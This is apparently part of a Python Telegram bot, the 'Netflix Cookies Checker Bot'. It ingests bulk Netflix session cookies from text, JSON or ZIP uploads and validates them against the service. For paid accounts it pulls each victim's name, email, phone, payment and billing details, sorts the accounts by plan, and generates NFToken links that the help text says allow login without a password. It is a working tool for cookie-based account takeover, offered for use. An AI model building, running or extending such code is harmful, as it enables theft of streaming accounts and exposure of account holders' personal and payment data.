# ======================== دالة تنسيق النتيجة للشات ========================
def format_account_details_for_chat(info, pc_link=None, mobile_link=None):
    if not info:
        return None, None

    plan_key, plan_display, is_paid = determine_plan(info)

    if not is_paid:
        return None, None

    lines = []

    if plan_key == "premium":
        lines.append("🌟 PREMIUM ACCOUNT 🌟")
    elif plan_key == "standard":
        lines.append("📺 STANDARD ACCOUNT 📺")
    elif plan_key == "basic":
        lines.append("🔰 BASIC ACCOUNT 🔰")
    elif plan_key == "mobile":
        lines.append("📱 MOBILE ACCOUNT 📱")
    else:
        lines.append("🎬 NETFLIX ACCOUNT 🎬")

    lines.append("")
    lines.append("✅ Status: Valid Paid Account")
    lines.append("")
    lines.append("👤 Account Details:")
    lines.append("")

    lines.append(f"   👤 Name: {info.get('name', 'Unknown')}")

    email = info.get('email')
    if email and email != 'Unknown' and email != 'None':
        lines.append(f"   📧 Email: {email}")

    country = info.get('country', 'Unknown')
    flag = country_to_flag(country)
    lines.append(f"   🌍 Country: {country} {flag}")

    lines.append(f"   📦 Plan: {plan_display}")

    account_status = info.get('status', 'Active')
    status_icon = {
        "Active": "🟢",
        "Expired": "🔴",
        "Cancelled": "🟠",
        "On Hold": "🟡",
        "Past Due": "🔴",
    }.get(account_status, "⚪")
    lines.append(f"   {status_icon} Account Status: {account_status}")

    member_since = info.get('memberSince')
    if member_since:
        formatted = format_member_since(member_since)
        if formatted and formatted != 'Unknown':
            lines.append(f"   📅 Member Since: {formatted}")

    next_billing = info.get('nextBilling')
    if next_billing:
        formatted_billing = format_date(next_billing)
        if formatted_billing and formatted_billing != 'Unknown':
            lines.append(f"   ⏰ Next Billing: {formatted_billing}")

    if info.get('payment'):
        lines.append(f"   💳 Payment: {info.get('payment')}")

    if info.get('phone'):
        phone_verified = info.get('phone_verified', '')
        check = "✅" if phone_verified == "Verified" else "❌"
        lines.append(f"   📱 Phone: {info.get('phone')} ({check})")

    if info.get('streams'):
        lines.append(f"   📺 Streams: {info.get('streams')}")

    lines.append(f"   ⏸️ Hold: {info.get('hold', 'No')}")
    lines.append(f"   👥 Extra Member: {info.get('extra_member', 'No')}")
    lines.append(f"   ✅ Email Verified: {info.get('email_verified', 'No')}")

    lines.append("")
    lines.append("👥 Profiles:")
    lines.append("")

    if info.get('profiles_count') and info.get('profiles_count') > 0:
        lines.append(f"   👥 Total: {info.get('profiles_count')}")
        profiles_list = info.get('profiles_list', 'Unknown')
        if len(profiles_list) > 100:
            profiles_list = profiles_list[:97] + "..."
        lines.append(f"   📝 List: {profiles_list}")
    else:
        lines.append("   No profiles found")

    text = "\n".join(lines)

    keyboard = None
    if pc_link and mobile_link:
        keyboard = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("💻 PC Login", url=pc_link),
                InlineKeyboardButton("📱 Mobile Login", url=mobile_link)
            ]
        ])

    return text, keyboard

# ======================== دالة تنسيق النتيجة للملفات ========================
def format_account_details_for_file(info, pc_link=None):
    if not info:
        return None

    plan_key, plan_display, is_paid = determine_plan(info)

    if not is_paid:
        return None

    details = []

    details.append("ACCOUNT DETAILS")
    details.append("-" * 40)
    details.append(f"👤 Name: {info.get('name', 'Unknown')}")

    email = info.get('email')
    if email and email != 'Unknown' and email != 'None':
        details.append(f"📧 Email: {email}")

    country = info.get('country', 'Unknown')
    flag = country_to_flag(country)
    details.append(f"🌍 Country: {country} {flag}")

    if info.get('language'):
        details.append(f"🔤 Language: {info.get('language')}")

    details.append(f"📦 Plan: {plan_display}")

    account_status = info.get('status', 'Active')
    status_icon = {
        "Active": "🟢",
        "Expired": "🔴",
        "Cancelled": "🟠",
        "On Hold": "🟡",
        "Past Due": "🔴",
    }.get(account_status, "⚪")
    details.append(f"{status_icon} Account Status: {account_status}")

    member_since = info.get('memberSince')
    if member_since:
        formatted = format_member_since(member_since)
        if formatted and formatted != 'Unknown':
            details.append(f"📅 Member Since: {formatted}")

    next_billing = info.get('nextBilling')
    if next_billing:
        formatted_billing = format_date(next_billing)
        if formatted_billing and formatted_billing != 'Unknown':
            details.append(f"⏰ Expiry Date: {formatted_billing}")

    if info.get('payment'):
        details.append(f"💳 Payment: {info.get('payment')}")

    if info.get('phone'):
        phone_verified = info.get('phone_verified', '')
        details.append(f"📱 Phone: {info.get('phone')} ({phone_verified})" if phone_verified else f"📱 Phone: {info.get('phone')}")

    if info.get('streams'):
        details.append(f"📺 Streams: {info.get('streams')}")

    details.append(f"⏸️ Hold Status: {info.get('hold', 'No')}")
    details.append(f"👥 Extra Member: {info.get('extra_member', 'No')}")
    details.append(f"✅ Email Verified: {info.get('email_verified', 'No')}")

    details.append("")
    details.append("PROFILES")
    details.append("-" * 40)

    if info.get('profiles_count') and info.get('profiles_count') > 0:
        details.append(f"👥 Total Profiles: {info.get('profiles_count')}")
        details.append(f"📝 Profiles List: {info.get('profiles_list', 'Unknown')}")
    else:
        details.append("No profiles found")

    if pc_link:
        details.append("")
        details.append("NFTOKEN LOGIN LINKS")
        details.append("-" * 40)
        details.append(f"PC Login:\n{pc_link}")
    else:
        details.append("")
        details.append("NFTOKEN LOGIN LINKS")
        details.append("-" * 40)
        details.append("PC Login: FAILED - Could not generate token")

    return "\n".join(details)

# ======================== البوت ========================
checking = False
results = {}
total_accounts = 0
processed = 0
chat_id = None
msg_id = None
stop_flag = False
scan_task = None

async def update_progress(context):
    global processed, total_accounts, chat_id, msg_id, checking, stop_flag
    if not checking or not chat_id:
        return

    if stop_flag:
        return

    percent = int((processed / total_accounts) * 100) if total_accounts > 0 else 0
    bar_len = 20
    filled = int(bar_len * processed / total_accounts) if total_accounts > 0 else 0
    bar = "█" * filled + "░" * (bar_len - filled)

    premium = sum(1 for r in results.values() if r.get("plan_key") == "premium")
    standard = sum(1 for r in results.values() if r.get("plan_key") in ["standard", "standard_with_ads"])
    basic = sum(1 for r in results.values() if r.get("plan_key") == "basic")
    mobile = sum(1 for r in results.values() if r.get("plan_key") == "mobile")
    invalid = sum(1 for r in results.values() if r.get("plan_key") == "invalid")

    active_count = sum(1 for r in results.values() if r.get("account_status") == "Active")
    expired_count = sum(1 for r in results.values() if r.get("account_status") == "Expired")
    cancelled_count = sum(1 for r in results.values() if r.get("account_status") == "Cancelled")
    hold_count = sum(1 for r in results.values() if r.get("account_status") == "On Hold")
    past_due_count = sum(1 for r in results.values() if r.get("account_status") == "Past Due")

    text = (
        f"🔄 Processing Started\n\n"
        f"📁 Total Cookies: {total_accounts}\n"
        f"⚙️ Mode: Fullinfo\n"
        f"🔧 Threads: 25 parallel\n\n"
        f"📊 Status:\n"
        f"   ├─ Processing: {processed}/{total_accounts}\n"
        f"   ├─ 💎 Premium: {premium}\n"
        f"   ├─ 📺 Standard: {standard}\n"
        f"   ├─ 🔰 Basic: {basic}\n"
        f"   ├─ 📱 Mobile: {mobile}\n"
        f"   └─ ❌ Invalid: {invalid}\n\n"
        f"🛡️ Account Status:\n"
        f"   ├─ 🟢 Active: {active_count}\n"
        f"   ├─ 🔴 Expired: {expired_count}\n"
        f"   ├─ 🟠 Cancelled: {cancelled_count}\n"
        f"   ├─ 🟡 On Hold: {hold_count}\n"
        f"   └─ 🔴 Past Due: {past_due_count}\n\n"
        f"{bar} {percent}%\n\n"
        f"⚠️ Use /cancel to stop this task"
    )

    try:
        await context.bot.edit_message_text(text, chat_id=chat_id, message_id=msg_id)
    except:
        pass

async def send_partial_results(context, chat_id_param, reason="cancelled"):
    global results, total_accounts, processed

    if not results:
        await context.bot.send_message(chat_id_param, "⚠️ No results to show.")
        return

    premium = sum(1 for r in results.values() if r.get("plan_key") == "premium")
    standard = sum(1 for r in results.values() if r.get("plan_key") in ["standard", "standard_with_ads"])
    basic = sum(1 for r in results.values() if r.get("plan_key") == "basic")
    mobile = sum(1 for r in results.values() if r.get("plan_key") == "mobile")
    invalid = sum(1 for r in results.values() if r.get("plan_key") == "invalid")
    valid = premium + standard + basic + mobile

    title = "🛑 Task Cancelled - Partial Results" if reason == "cancelled" else "⚠️ Task Stopped - Partial Results"

    result_text = (
        f"{title}\n\n"
        f"📊 Statistics (Partial):\n"
        f"   ├─ Processed: {processed}/{total_accounts}\n"
        f"   ├─ Valid Paid Accounts: {valid}\n"
        f"   ├─ 💎 Premium: {premium}\n"
        f"   ├─ 📺 Standard: {standard}\n"
        f"   ├─ 🔰 Basic: {basic}\n"
        f"   ├─ 📱 Mobile: {mobile}\n"
        f"   └─ ❌ Invalid/Free: {invalid}"
    )
    await context.bot.send_message(chat_id_param, result_text)

    plan_files = {
        "premium": "PREMIUM_ACCOUNTS.txt",
        "standard": "STANDARD_ACCOUNTS.txt",
        "standard_with_ads": "STANDARD_WITH_ADS_ACCOUNTS.txt",
        "basic": "BASIC_ACCOUNTS.txt",
        "mobile": "MOBILE_ACCOUNTS.txt",
    }

    for plan_key, out_filename in plan_files.items():
        plan_results = [(name, data) for name, data in results.items() if data.get("plan_key") == plan_key]
        if not plan_results:
            continue

        content = f"🎬 NETFLIX ACCOUNTS - {plan_key.upper()}\n{'=' * 50}\n\n"
        for acc_name, data in plan_results:
            content += f"{data.get('details', 'No details')}\n"
            content += f"\n{'-' * 40}\n\n"

        try:
            encoded_content = content.encode("utf-8", errors="ignore")
            await context.bot.send_document(
                chat_id=chat_id_param,
                document=BytesIO(encoded_content),
                filename=out_filename
            )
        except Exception as e:
            print(f"[ERROR] Failed to send {out_filename}: {e}")

# ======================== دالة الفحص الرئيسية ========================
async def run_scan(context, chat_id_param, all_accounts, is_text_mode=False):
    global checking, results, total_accounts, processed, stop_flag, msg_id

    start_time = time.time()
    msg = await context.bot.send_message(chat_id_param, "🔄 Processing Started...")
    msg_id = msg.message_id

    for idx, account in enumerate(all_accounts):
        if stop_flag:
            break

        processed = idx + 1
        await update_progress(context)

        if stop_flag:
            break

        cookies = account["cookies"]
        source = account.get("source", "text_message")
        netflix_id = cookies.get("NetflixId")

        info, error = await get_account_info(cookies)

        if stop_flag:
            if info and not error:
                plan_key, plan_display, is_paid = determine_plan(info)
                pc_link = None
                mobile_link = None
                if is_paid and netflix_id:
                    token = await create_nftoken_link(netflix_id)
                    if token:
                        pc_link = create_pc_link(token)
                        mobile_link = create_mobile_link(token)

                if is_text_mode:
                    details, keyboard = format_account_details_for_chat(info, pc_link, mobile_link)
                    results[f"{source}_acc_{idx+1}"] = {
                        "plan_key": plan_key,
                        "plan": plan_display,
                        "details": details,
                        "keyboard": keyboard,
                        "account_status": info.get('status', 'Active'),
                    }
                else:
                    details = format_account_details_for_file(info, pc_link)
                    results[f"{source}_acc_{idx+1}"] = {
                        "plan_key": plan_key,
                        "plan": plan_display,
                        "details": details,
                        "account_status": info.get('status', 'Active'),
                    }
            break

        if error or not info:
            results[f"{source}_acc_{idx+1}"] = {
                "plan_key": "invalid",
                "plan": "Invalid",
                "details": f"❌ Error: {error or 'Unknown'}",
                "account_status": "Invalid",
            }
            continue

        plan_key, plan_display, is_paid = determine_plan(info)

        pc_link = None
        mobile_link = None
        if is_paid and netflix_id:
            token = await create_nftoken_link(netflix_id)
            if token:
                pc_link = create_pc_link(token)
                mobile_link = create_mobile_link(token)

        if is_text_mode:
            details, keyboard = format_account_details_for_chat(info, pc_link, mobile_link)
            results[f"{source}_acc_{idx+1}"] = {
                "plan_key": plan_key,
                "plan": plan_display,
                "details": details,
                "keyboard": keyboard,
                "account_status": info.get('status', 'Active'),
            }
        else:
            details = format_account_details_for_file(info, pc_link)
            results[f"{source}_acc_{idx+1}"] = {
                "plan_key": plan_key,
                "plan": plan_display,
                "details": details,
                "account_status": info.get('status', 'Active'),
            }

        await asyncio.sleep(0.05)

    checking = False

    try:
        await context.bot.delete_message(chat_id=chat_id_param, message_id=msg_id)
    except:
        pass

    if stop_flag:
        await send_partial_results(context, chat_id_param, reason="cancelled")
        if is_text_mode:
            for acc_name, data in results.items():
                if data.get("plan_key") != "invalid":
                    details = data.get('details', '')
                    keyboard = data.get('keyboard', None)
                    if details:
                        try:
                            if keyboard:
                                await context.bot.send_message(chat_id_param, details, reply_markup=keyboard)
                            else:
                                await context.bot.send_message(chat_id_param, details)
                        except:
                            pass
        return

    elapsed = time.time() - start_time
    premium = sum(1 for r in results.values() if r.get("plan_key") == "premium")
    standard = sum(1 for r in results.values() if r.get("plan_key") in ["standard", "standard_with_ads"])
    basic = sum(1 for r in results.values() if r.get("plan_key") == "basic")
    mobile = sum(1 for r in results.values() if r.get("plan_key") == "mobile")
    invalid = sum(1 for r in results.values() if r.get("plan_key") == "invalid")
    valid = premium + standard + basic + mobile
    speed = valid / elapsed if elapsed > 0 else 0

    result_text = (
        f"✅ Processing Complete\n\n"
        f"📊 Final Statistics:\n"
        f"   ├─ Total Accounts Scanned: {total_accounts}\n"
        f"   ├─ Valid Paid Accounts: {valid}\n"
        f"   ├─ 💎 Premium: {premium}\n"
        f"   ├─ 📺 Standard: {standard}\n"
        f"   ├─ 🔰 Basic: {basic}\n"
        f"   ├─ 📱 Mobile: {mobile}\n"
        f"   └─ ❌ Invalid/Free: {invalid}\n"
        f"   ├─ Time Taken: {elapsed:.2f} seconds\n"
        f"   └─ Speed: {speed:.2f} accounts/second"
    )

    await context.bot.send_message(chat_id_param, result_text)

    if is_text_mode:
        if valid > 0:
            for acc_name, data in results.items():
                if data.get("plan_key") != "invalid":
                    details = data.get('details', '')
                    keyboard = data.get('keyboard', None)
                    if details:
                        try:
                            if keyboard:
                                await context.bot.send_message(chat_id_param, details, reply_markup=keyboard)
                            else:
                                await context.bot.send_message(chat_id_param, details)
                        except:
                            pass
        else:
            await context.bot.send_message(chat_id_param, "⚠️ No valid paid accounts found!")

        if invalid > 0:
            await context.bot.send_message(chat_id_param, f"⚠️ Invalid/Free accounts: {invalid}\n(These were skipped)")
    else:
        plan_files = {
            "premium": "PREMIUM_ACCOUNTS.txt",
            "standard": "STANDARD_ACCOUNTS.txt",
            "standard_with_ads": "STANDARD_WITH_ADS_ACCOUNTS.txt",
            "basic": "BASIC_ACCOUNTS.txt",
            "mobile": "MOBILE_ACCOUNTS.txt",
        }

        for plan_key, out_filename in plan_files.items():
            plan_results = [(name, data) for name, data in results.items() if data.get("plan_key") == plan_key]
            if not plan_results:
                continue

            content = f"🎬 NETFLIX ACCOUNTS - {plan_key.upper()}\n{'=' * 50}\n\n"
            for acc_name, data in plan_results:
                content += f"{data.get('details', 'No details')}\n"
                content += f"\n{'-' * 40}\n\n"

            try:
                encoded_content = content.encode("utf-8", errors="ignore")
                await context.bot.send_document(
                    chat_id=chat_id_param,
                    document=BytesIO(encoded_content),
                    filename=out_filename
                )
            except Exception as e:
                print(f"[ERROR] Failed to send {out_filename}: {e}")

        if valid == 0:
            await context.bot.send_message(chat_id_param, "⚠️ No valid paid accounts found in the file!")

# ======================== الأوامر ========================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    name = user.first_name or "User"

    text = (
        f"🎬 Netflix Cookies Checker Bot\n"
        f"👨‍💻 Developer: Eyad 🐼\n\n"
        f"✨ Welcome {name}! ✨\n\n"
        f"📌 WHAT I DO:\n"
        f"   ├─ Verify Netflix cookies\n"
        f"   └─ Extract premium account details\n\n"
        f"📖 HOW TO USE:\n"
        f"   1️⃣ Export cookies (.txt or .json)\n"
        f"   2️⃣ Send files directly (single or ZIP)\n"
        f"   3️⃣ OR send cookies as text message 📝\n"
        f"   4️⃣ Watch progress bar\n"
        f"   5️⃣ Receive results with PC & Mobile buttons\n\n"
        f"✅ Supported Cookie Formats:\n"
        f"   ├─ Netscape format (*.txt files)\n"
        f"   ├─ Simple format (NetflixId=value)\n"
        f"   ├─ JSON format\n"
        f"   └─ ZIP archives\n\n"
        f"⚙️ COMMANDS:\n"
        f"   ├─ /start → Show menu\n"
        f"   ├─ /help → Instructions\n"
        f"   ├─ /stats → Statistics\n"
        f"   └─ /cancel → Stop task\n\n"
        f"📁 Send cookies file or paste cookies text to start"
    )

    await update.message.reply_text(text)

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        f"📖 HOW TO USE:\n\n"
        f"طريقة 1 - إرسال ملف:\n"
        f"   1️⃣ Export Netflix cookies using browser extension\n"
        f"   2️⃣ Save as .txt format\n"
        f"   3️⃣ Send file directly to bot\n\n"
        f"طريقة 2 - إرسال نص:\n"
        f"   1️⃣ انسخ الكوكيز بأي شكل\n"
        f"   2️⃣ الصق النص في الشات وأرسله\n"
        f"   3️⃣ البوت سيتعرف عليه تلقائياً\n\n"
        f"📁 Supported formats:\n"
        f"   ├─ .txt (Netscape format)\n"
        f"   ├─ .json (JSON format)\n"
        f"   ├─ .zip (Archive)\n"
        f"   └─ Direct text message ✨\n\n"
        f"⚙️ Commands:\n"
        f"   ├─ /start - Main menu\n"
        f"   ├─ /help - This help\n"
        f"   ├─ /stats - Statistics\n"
        f"   └─ /cancel - Stop current task\n\n"
        f"🔑 NFToken Info:\n"
        f"   The NFToken link allows direct login to Netflix\n"
        f"   without password. It expires after approximately 1 hour."
    )
    await update.message.reply_text(text)

async def stats_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global total_accounts, results

    if total_accounts == 0:
        await update.message.reply_text("📭 No statistics available.\nSend me some cookies files first!")
        return

    premium = sum(1 for r in results.values() if r.get("plan_key") == "premium")
    standard = sum(1 for r in results.values() if r.get("plan_key") in ["standard", "standard_with_ads"])
    basic = sum(1 for r in results.values() if r.get("plan_key") == "basic")
    mobile = sum(1 for r in results.values() if r.get("plan_key") == "mobile")
    invalid = sum(1 for r in results.values() if r.get("plan_key") == "invalid")
    valid = premium + standard + basic + mobile

    text = (
        f"📊 Statistics:\n\n"
        f"📁 Total Accounts: {total_accounts}\n"
        f"✅ Valid Paid Accounts: {valid}\n"
        f"   ├─ 💎 Premium: {premium}\n"
        f"   ├─ 📺 Standard: {standard}\n"
        f"   ├─ 🔰 Basic: {basic}\n"
        f"   └─ 📱 Mobile: {mobile}\n"
        f"❌ Invalid/Free: {invalid}"
    )
    await update.message.reply_text(text)

async def cancel_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global checking, stop_flag
    if checking:
        stop_flag = True
        await update.message.reply_text("🛑 Cancelling task... Please wait for partial results.")
    else:
        await update.message.reply_text("⚠️ No active task to cancel.")

# ======================== معالجة الملفات ========================
async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global checking, results, total_accounts, processed, chat_id, stop_flag, scan_task

    if checking:
        await update.message.reply_text("⚠️ A scan is already running!\nPlease wait or use /cancel to stop.")
        return

    doc = update.message.document
    if not doc:
        return

    filename = doc.file_name
    ext = os.path.splitext(filename)[1].lower()

    if ext not in [".txt", ".json", ".zip"]:
        await update.message.reply_text(f"❌ Unsupported format: {ext}\n\nSupported: .txt , .json , .zip")
        return

    await update.message.reply_text(f"📥 Received: {filename}\n\n🔄 Extracting accounts...")

    file = await context.bot.get_file(doc.file_id)
    file_bytes = await file.download_as_bytearray()

    all_accounts = []

    if ext == ".zip":
        try:
            with zipfile.ZipFile(BytesIO(file_bytes)) as zf:
                for name in zf.namelist():
                    if name.lower().endswith((".txt", ".json")):
                        with zf.open(name) as f:
                            content = f.read().decode("utf-8", errors="ignore")
                            accounts = extract_all_cookies_from_file(content)
                            for acc in accounts:
                                acc["source"] = name
                                all_accounts.append(acc)
        except Exception as e:
            await update.message.reply_text(f"❌ Failed to extract ZIP file: {str(e)[:50]}")
            return
    else:
        content = file_bytes.decode("utf-8", errors="ignore")
        accounts = extract_all_cookies_from_file(content)
        for acc in accounts:
            acc["source"] = filename
            all_accounts.append(acc)

    if not all_accounts:
        await update.message.reply_text("❌ No valid cookies found in file!")
        return

    total_accounts = len(all_accounts)
    await update.message.reply_text(f"✅ Found {total_accounts} accounts in file\n\n🚀 Starting scan...")

    checking = True
    stop_flag = False
    results = {}
    processed = 0
    chat_id = update.effective_chat.id

    scan_task = asyncio.create_task(run_scan(context, chat_id, all_accounts, is_text_mode=False))

# ======================== معالجة النص المباشر ========================
async def handle_text_cookies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global checking, results, total_accounts, processed, chat_id, stop_flag, scan_task

    if checking:
        await update.message.reply_text("⚠️ A scan is already running!\nPlease wait or use /cancel to stop.")
        return

    text = update.message.text.strip()

    if text.startswith('/'):
        return

    if 'NetflixId' not in text:
        return

    await update.message.reply_text("🔍 Detected cookies in your message!\n\n🔄 Extracting accounts from text...")

    all_accounts = extract_all_cookies_from_file(text)

    if not all_accounts:
        await update.message.reply_text("❌ No valid cookies found in your message!")
        return

    total_accounts = len(all_accounts)
    await update.message.reply_text(f"✅ Found {total_accounts} account(s) in your message\n\n🚀 Starting scan...")

    checking = True
    stop_flag = False
    results = {}
    processed = 0
    chat_id = update.effective_chat.id

    scan_task = asyncio.create_task(run_scan(context, chat_id, all_accounts, is_text_mode=True))

# ======================== Main ========================
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("stats", stats_cmd))
    app.add_handler(CommandHandler("cancel", cancel_cmd))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_cookies))

    print("=" * 50)
    print("✅ Netflix Checker Bot is running...")
    print("✅ Async mode - /cancel responds INSTANTLY")
    print("✅ Enhanced profile extraction (15 methods)")
    print("✅ UI names filtered (Manage Profiles, Admin, etc.)")
    print("✅ Date formatting fixed")
    print("=" * 50)

    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
